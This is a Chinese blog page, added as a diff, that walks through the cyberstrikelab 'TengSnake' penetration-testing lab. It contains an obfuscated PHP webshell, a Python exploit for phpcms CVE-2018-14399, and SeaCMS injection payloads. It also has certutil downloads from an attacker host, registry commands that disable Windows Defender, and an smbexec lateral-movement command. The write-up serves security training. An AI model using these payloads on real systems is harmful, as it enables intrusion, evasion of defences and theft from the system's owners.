@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
+    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="信息收集  去找找帝国cms的漏洞,有后台文件上传，去登录发现有认证码根据前面的猜一猜有admin123456 、cslab等等发现是cslab登录成功 帝国cms 后台rce在模版管理处填写这个shell 123456789&lt;?php$aa &#x3D; base64_decode(ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cyberstrikelab-TengSnake">
+<meta property="og:url" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/index.html">
+<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
+<meta property="og:description" content="信息收集  去找找帝国cms的漏洞,有后台文件上传，去登录发现有认证码根据前面的猜一猜有admin123456 、cslab等等发现是cslab登录成功 帝国cms 后台rce在模版管理处填写这个shell 123456789&lt;?php$aa &#x3D; base64_decode(ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530131443678.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530124530437.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530124708546.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530124840575.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530125316499.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530125527169.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530125848217.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530130537543.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530130943196.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530132248577.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530132547978.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530132954768.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530141945903.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530143115103.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530143557392.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530144138713.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530150257870.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530151141994.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250531112925985.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250531113038385.png">
+<meta property="og:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250531113712458.png">
+<meta property="article:published_time" content="2025-05-27T05:53:59.000Z">
+<meta property="article:modified_time" content="2025-06-01T05:51:04.347Z">
+<meta property="article:author" content="Oceanzbz">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="cyberstrikelab">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530131443678.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>cyberstrikelab-TengSnake</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-QWTJSPQL4F');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/05/31/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/Gear/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/26/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/lab9/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&text=cyberstrikelab-TengSnake"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&title=cyberstrikelab-TengSnake"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&is_video=false&description=cyberstrikelab-TengSnake"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=cyberstrikelab-TengSnake&body=Check out this article: https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&title=cyberstrikelab-TengSnake"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&title=cyberstrikelab-TengSnake"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&title=cyberstrikelab-TengSnake"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&title=cyberstrikelab-TengSnake"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&name=cyberstrikelab-TengSnake&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/&t=cyberstrikelab-TengSnake"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%9D%E5%9B%BDcms-%E5%90%8E%E5%8F%B0rce"><span class="toc-number">2.</span> <span class="toc-text">帝国cms 后台rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpcms-v9-6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-CVE-2018-14399"><span class="toc-number">4.</span> <span class="toc-text">phpcms v9.6.0任意文件上传漏洞(CVE-2018-14399)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">5.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zerologon"><span class="toc-number">6.</span> <span class="toc-text">zerologon</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        cyberstrikelab-TengSnake
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Oceanzbz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-27T05:53:59.000Z" class="dt-published" itemprop="datePublished">2025-05-27</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/cyberstrikelab/" rel="tag">cyberstrikelab</a>, <a class="p-category" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530131443678.png" class="">
+
+<p>去找找帝国cms的漏洞,有后台文件上传，去登录发现有认证码根据前面的猜一猜有admin123456 、cslab等等发现是cslab登录成功</p>
+<h2 id="帝国cms-后台rce"><a href="#帝国cms-后台rce" class="headerlink" title="帝国cms 后台rce"></a>帝国cms 后台rce</h2><p>在模版管理处填写这个shell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$aa</span> = <span class="title function_ invoke__">base64_decode</span>(ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA);</span><br><span class="line">$&#123;(system)(<span class="variable">$aa</span>)&#125;;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA</span><br><span class="line">=&gt;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;?php eval($_REQUEST[hp]);&#x27;</span>&gt;shell.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530124530437.png" class="">
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530124708546.png" class="">
+<p>再点击<strong>启用此方案</strong>即可getshell，在e&#x2F;admin&#x2F;template&#x2F;目录下生成shell.php</p>
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530124840575.png" class="">
+
+<p>参考: <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ocP2GJ4iF3z1mv37UoJ4xw">https://mp.weixin.qq.com/s/ocP2GJ4iF3z1mv37UoJ4xw</a></p>
+<p>翻找配置文件发现了另一台主机的数据库密码</p>
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530125316499.png" class="">
+
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530125527169.png" class="">
+
+<p>没找到什么有用的信息。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>利用udf提个权</p>
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530125848217.png" class="">
+
+<p>没有system权限，先弹个shell到cs上去利用插件去做个土豆提权试试</p>
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530130537543.png" class="">
+
+<p>有杀软需要做一个免杀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://172.16.233.2/main.txt main.txt</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f http://172.16.233.2/RingQ.exe RingQ.exe</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530130943196.png" class="">
+
+<p>成功提权到system权限</p>
+<h2 id="phpcms-v9-6-0任意文件上传漏洞-CVE-2018-14399"><a href="#phpcms-v9-6-0任意文件上传漏洞-CVE-2018-14399" class="headerlink" title="phpcms v9.6.0任意文件上传漏洞(CVE-2018-14399)"></a>phpcms v9.6.0任意文件上传漏洞(CVE-2018-14399)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randomstring</span>(<span class="params">length</span>):</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    dic = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(length)):</span><br><span class="line">        s += dic[random.randint(<span class="number">0</span>,<span class="number">25</span>)]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url</span>):</span><br><span class="line">    u = <span class="string">&#x27;&#123;&#125;/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1&#x27;</span>.<span class="built_in">format</span>(url)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;siteid&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;modelid&#x27;</span>: <span class="string">&#x27;11&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;%s&quot;</span>%randomstring(<span class="number">12</span>),</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;%s&quot;</span>%randomstring(<span class="number">12</span>),</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">&quot;%s@qq.com&quot;</span>%randomstring(<span class="number">12</span>),</span><br><span class="line">        <span class="string">&#x27;info[content]&#x27;</span>: <span class="string">&#x27;&lt;img src=http://172.16.233.2/1.txt?.php#.jpg&gt;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dosubmit&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;cookie:&#x27;</span>:<span class="string">&#x27;PHPSESSID=t3id73sqv3dbnkhbbd0ojeh5r0; XDEBUG_SESSION=PHPSTORM&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    rep = requests.post(u, data=data)</span><br><span class="line">    <span class="comment">#print rep.content</span></span><br><span class="line"></span><br><span class="line">    shell = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    re_result = re.findall(<span class="string">r&#x27;&amp;lt;img src=(.*)&amp;gt&#x27;</span>, rep.content)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(re_result):</span><br><span class="line">        shell = re_result[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> shell:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;shell:&#x27;</span>,shell</span><br><span class="line"></span><br><span class="line">    tmp = time.strftime(<span class="string">&#x27;%Y%m%d%I%M%S&#x27;</span>,time.localtime(time.time()))</span><br><span class="line">    path = time.strftime(<span class="string">&#x27;%Y&#x27;</span>,time.localtime(time.time()))+<span class="string">&#x27;/&#x27;</span>+time.strftime(<span class="string">&#x27;%m%d&#x27;</span>,time.localtime(time.time()))+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>,<span class="number">999</span>):</span><br><span class="line">        filename = tmp+<span class="built_in">str</span>(i)+<span class="string">&#x27;.php&#x27;</span></span><br><span class="line">        shell = url+<span class="string">&#x27;uploadfile/&#x27;</span>+path+filename</span><br><span class="line">        req = requests.get(url=shell)</span><br><span class="line">        <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;brute shell:&#x27;</span>,shell</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    poc(<span class="string">&#x27;http://172.20.55.34/&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530132248577.png" class="">
+
+<p>同样的用个土豆提权即可</p>
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530132547978.png" class="">
+
+
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530132954768.png" class="">
+
+<p>这台机器有两个网卡<br>参考： <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3NN6HIZwIDuyoLBC_tUyuw">https://mp.weixin.qq.com/s/3NN6HIZwIDuyoLBC_tUyuw</a></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>在扫描之前先添加用户和开启rdp，去关闭下防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>关闭windows defender 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiSpyware&quot; /d 1 /t REG_DWORD</span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530141945903.png" class="">
+
+<p>发现扫出了俩漏洞那就去试试</p>
+<p>参考： <a target="_blank" rel="noopener" href="https://github.com/chaitin/xray/blob/master/pocs/seacmsv645-command-exec.yml">https://github.com/chaitin/xray/blob/master/pocs/seacmsv645-command-exec.yml</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchtype=<span class="number">5</span>&amp;order=%<span class="number">7</span>D%<span class="number">7</span>Bend+<span class="keyword">if</span>%<span class="number">7</span>D%<span class="number">7</span>Bif%<span class="number">3</span>A1%<span class="number">29</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bfunc%<span class="number">5</span>D%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bcmd%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>Bif%<span class="number">281</span>%<span class="number">7</span>D%<span class="number">7</span>Bend+<span class="keyword">if</span>%<span class="number">7</span>D&amp;func=system&amp;cmd=<span class="keyword">echo</span> PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSkgPz4=&gt;<span class="number">1</span>.txt</span><br><span class="line"></span><br><span class="line">searchtype=<span class="number">5</span>&amp;order=%<span class="number">7</span>D%<span class="number">7</span>Bend+<span class="keyword">if</span>%<span class="number">7</span>D%<span class="number">7</span>Bif%<span class="number">3</span>A1%<span class="number">29</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bfunc%<span class="number">5</span>D%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>Bcmd%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>Bif%<span class="number">281</span>%<span class="number">7</span>D%<span class="number">7</span>Bend+<span class="keyword">if</span>%<span class="number">7</span>D&amp;func=system&amp;cmd=certutil -decode <span class="number">1</span>.txt <span class="number">2</span>.php</span><br></pre></td></tr></table></figure>
+
+<p>写shell</p>
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530143115103.png" class="">
+
+
+<p>之后在解码就可以了，之后去翻翻配置文件因为有提示为sql.txt</p>
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530143557392.png" class="">
+
+<p>发现另一台sql的用户名和密码，连接一下</p>
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530144138713.png" class="">
+
+<p>提示说有共享文件，建立了连接去看看，但是我这里没找到ipc连接，所以看其他师傅的wp了，发现这个ipc是一个定时任务。</p>
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530150257870.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 smbexec.py administrator@10.10.10.15 </span><br></pre></td></tr></table></figure>
+
+<img src="/2025/05/27/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/cyberstrikelab/TengSnake/20250530151141994.png" class="">
+
